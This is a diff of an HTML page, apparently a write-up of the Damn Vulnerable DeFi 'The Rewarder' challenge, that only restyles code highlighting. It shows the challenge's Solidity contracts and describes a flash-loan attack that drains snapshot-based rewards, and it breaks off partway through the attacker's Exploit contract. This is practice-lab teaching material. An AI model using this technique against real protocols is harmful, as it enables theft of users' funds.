+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">12</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {ERC20} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/token/ERC20/ERC20.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {AccessControl} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/access/AccessControl.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">ERC20</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/token/ERC20/ERC20.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">AccessControl</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/access/AccessControl.sol&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @title RewardToken
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @dev A mintable ERC20 with 2 decimals to issue rewards
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> RewardToken <span style="color:#fff;font-weight:bold">is</span> ERC20, AccessControl {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> MINTER_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;MINTER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#95a5a6">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @title RewardToken
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @dev A mintable ERC20 with 2 decimals to issue rewards
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">RewardToken</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ERC20</span>, <span style="color:#434f54">AccessControl</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">MINTER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;MINTER_ROLE&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    error Forbidden();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">Forbidden</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>() ERC20(<span style="color:#0ff;font-weight:bold">&#34;Reward Token&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;RWT&#34;</span>) {
-</span></span><span style="display:flex;"><span>        _setupRole(DEFAULT_ADMIN_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>        _setupRole(MINTER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() <span style="color:#434f54">ERC20</span>(<span style="color:#7f8c8d">&#34;Reward Token&#34;</span>, <span style="color:#7f8c8d">&#34;RWT&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">DEFAULT_ADMIN_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> mint(<span style="color:#fff;font-weight:bold">address</span> to, <span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (!hasRole(MINTER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>)) <span style="color:#fff;font-weight:bold">revert</span> Forbidden();
-</span></span><span style="display:flex;"><span>        _mint(to, amount);
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">mint</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">to</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">hasRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">Forbidden</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_mint</span>(<span style="color:#434f54">to</span>, <span style="color:#434f54">amount</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="flashloanerpool">
@@ -418,32 +418,32 @@ reward tokens. It gives that minter role only to the contract creator:</p>
 familiar with. We can use it to borrow some DVT&rsquo;s by
 implementing the <code>receiveFlashLoan(uint256)</code> function in our
 <code>Exploit</code> contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> FlashLoanerPool <span style="color:#fff;font-weight:bold">is</span> ReentrancyGuard {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ReentrancyGuard</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">Address</span> <span style="color:#728e00">for</span> <span style="color:#00979d">address</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DamnValuableToken <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">immutable</span> liquidityToken;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableToken</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">liquidityToken</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    error NotEnoughTokensInPool();
-</span></span><span style="display:flex;"><span>    error FlashLoanHasNotBeenPaidBack();
-</span></span><span style="display:flex;"><span>    error BorrowerMustBeAContract();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">BorrowerMustBeAContract</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(<span style="color:#fff;font-weight:bold">address</span> liquidityTokenAddress) {
-</span></span><span style="display:flex;"><span>        liquidityToken = DamnValuableToken(liquidityTokenAddress);
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">liquidityTokenAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">liquidityToken</span> <span style="color:#728e00">=</span> <span style="color:#434f54">DamnValuableToken</span>(<span style="color:#434f54">liquidityTokenAddress</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = liquidityToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (amount &gt; balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughTokensInPool();
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (!<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>.isContract()) <span style="color:#fff;font-weight:bold">revert</span> BorrowerMustBeAContract();
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">&gt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#434f54">isContract</span>()) <span style="color:#728e00">revert</span> <span style="color:#434f54">BorrowerMustBeAContract</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        liquidityToken.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amount);
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">liquidityToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amount</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>.functionCall(
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(<span style="color:#0ff;font-weight:bold">&#34;receiveFlashLoan(uint256)&#34;</span>, amount)
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#434f54">functionCall</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(<span style="color:#7f8c8d">&#34;receiveFlashLoan(uint256)&#34;</span>, <span style="color:#434f54">amount</span>)
 </span></span><span style="display:flex;"><span>        );
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (liquidityToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>)) &lt; balanceBefore)
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>)) <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="therewarderpool">
@@ -454,19 +454,19 @@ implementing the <code>receiveFlashLoan(uint256)</code> function in our
   </a>
 </h3>
 <p>Let&rsquo;s examine public/external functions of this contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> deposit(<span style="color:#fff;font-weight:bold">uint256</span> amountToDeposit) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (amountToDeposit == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">revert</span> MustDepositTokens();
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">deposit</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToDeposit</span>) <span style="color:#728e00">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amountToDeposit</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustDepositTokens</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex; background-color:#191919"><span>    accToken.mint(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amountToDeposit); <span style="color:#007f7f">// &lt;--
-</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    distributeRewards(); <span style="color:#007f7f">// &lt;--
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (
-</span></span><span style="display:flex;"><span>        !liquidityToken.transferFrom(
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>),
-</span></span><span style="display:flex;"><span>            amountToDeposit
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">accToken</span>.<span style="color:#434f54">mint</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToDeposit</span>); <span style="color:#95a5a6">// &lt;--
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">distributeRewards</span>(); <span style="color:#95a5a6">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">!</span><span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">transferFrom</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#434f54">amountToDeposit</span>
 </span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>    ) <span style="color:#fff;font-weight:bold">revert</span> TransferFail();
+</span></span><span style="display:flex;"><span>    ) <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFail</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><ul>
 <li>Requires the deposit to be greater than zero.</li>
@@ -477,41 +477,41 @@ the deposited DVT&rsquo;s for each round and distributes the rewards.</li>
 <li>Transfers the <code>amountOfDeposit</code> of DVT tokens from <code>msg.sender</code> to this contract.</li>
 </ul>
 <p>The <code>withdraw</code> function does two things:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> withdraw(<span style="color:#fff;font-weight:bold">uint256</span> amountToWithdraw) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>    accToken.burn(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amountToWithdraw);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!liquidityToken.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amountToWithdraw))
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> TransferFail();
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToWithdraw</span>) <span style="color:#728e00">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">accToken</span>.<span style="color:#434f54">burn</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToWithdraw</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">liquidityToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToWithdraw</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFail</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><ul>
 <li>Burns the <code>amountToWithdraw</code> rTKN tokens.</li>
 <li>Transfers DVT tokens to the caller account.</li>
 </ul>
 <p>Now, let&rsquo;s review the most interesting function in this contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> distributeRewards() <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> rewards = <span style="color:#ff0;font-weight:bold">0</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">distributeRewards</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewards</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (isNewRewardsRound()) {
-</span></span><span style="display:flex; background-color:#191919"><span>        _recordSnapshot();
-</span></span><span style="display:flex; background-color:#191919"><span>    }
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">isNewRewardsRound</span>()) {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">_recordSnapshot</span>();
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> totalDeposits = accToken.totalSupplyAt(
-</span></span><span style="display:flex;"><span>        lastSnapshotIdForRewards
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">totalDeposits</span> <span style="color:#728e00">=</span> <span style="color:#434f54">accToken</span>.<span style="color:#434f54">totalSupplyAt</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastSnapshotIdForRewards</span>
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amountDeposited = accToken.balanceOfAt(
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>,
-</span></span><span style="display:flex;"><span>        lastSnapshotIdForRewards
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">=</span> <span style="color:#434f54">accToken</span>.<span style="color:#434f54">balanceOfAt</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastSnapshotIdForRewards</span>
 </span></span><span style="display:flex;"><span>    );
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (amountDeposited &gt; <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; totalDeposits &gt; <span style="color:#ff0;font-weight:bold">0</span>) {
-</span></span><span style="display:flex; background-color:#191919"><span>        rewards = (amountDeposited * <span style="color:#ff0;font-weight:bold">100</span> * <span style="color:#ff0;font-weight:bold">10</span>**<span style="color:#ff0;font-weight:bold">18</span>) / totalDeposits;
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#434f54">totalDeposits</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>) {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewards</span> <span style="color:#728e00">=</span> (<span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">100</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>) <span style="color:#728e00">/</span> <span style="color:#434f54">totalDeposits</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (rewards &gt; <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; !_hasRetrievedReward(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>)) {
-</span></span><span style="display:flex; background-color:#191919"><span>            rewardToken.mint(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, rewards);
-</span></span><span style="display:flex;"><span>            lastRewardTimestamps[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = <span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">rewards</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#728e00">!</span><span style="color:#434f54">_hasRetrievedReward</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#434f54">rewardToken</span>.<span style="color:#434f54">mint</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">rewards</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#434f54">lastRewardTimestamps</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> rewards;
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#434f54">rewards</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>It uses snapshots to calculate the rewards. Users get their
 rewards dependent on the amount deposited vs total deposits in
@@ -544,46 +544,46 @@ deposit in a new round. The <code>distributeRewards</code> uses the
 snapshot to get the <code>totalDeposits</code> so we can withdraw the
 deposited DVT&rsquo;s right away. Then we pay back the flash loan and
 transfer all the rewards to the <code>owner</code> (attacker):</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Exploit <span style="color:#fff;font-weight:bold">is</span> DSTest {
-</span></span><span style="display:flex;"><span>    TheRewarderPool <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> rewarder;
-</span></span><span style="display:flex;"><span>    FlashLoanerPool <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> flashLoaner;
-</span></span><span style="display:flex;"><span>    DamnValuableToken <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> dvt;
-</span></span><span style="display:flex;"><span>    RewardToken <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> rwt;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> owner;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Exploit</span> <span style="color:#728e00">is</span> <span style="color:#434f54">DSTest</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">TheRewarderPool</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">rewarder</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">flashLoaner</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableToken</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">dvt</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">RewardToken</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">rwt</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">owner</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(TheRewarderPool _rewarder, FlashLoanerPool _flashLoaner) {
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
-</span></span><span style="display:flex;"><span>        rewarder = _rewarder;
-</span></span><span style="display:flex;"><span>        flashLoaner = _flashLoaner;
-</span></span><span style="display:flex;"><span>        dvt = _rewarder.liquidityToken();
-</span></span><span style="display:flex;"><span>        rwt = _rewarder.rewardToken();
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">TheRewarderPool</span> <span style="color:#434f54">_rewarder</span>, <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#434f54">_flashLoaner</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
